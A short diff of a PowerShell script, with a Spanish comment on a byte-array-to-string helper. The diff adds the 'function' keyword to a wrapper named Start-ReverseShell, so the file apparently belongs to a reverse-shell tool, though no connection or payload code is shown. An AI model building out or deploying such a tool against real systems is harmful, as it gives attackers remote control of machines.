@@ -1,6 +1,6 @@
 # Funcion encargada de convertir un arreglo de bytes y lo convierte en una cadena utilizando la codificacion especificada, como UTF-8
 
-Start-ReverseShell {
+function Start-ReverseShell {
 function ConvertFrom-ByteArray {
 
     Param (
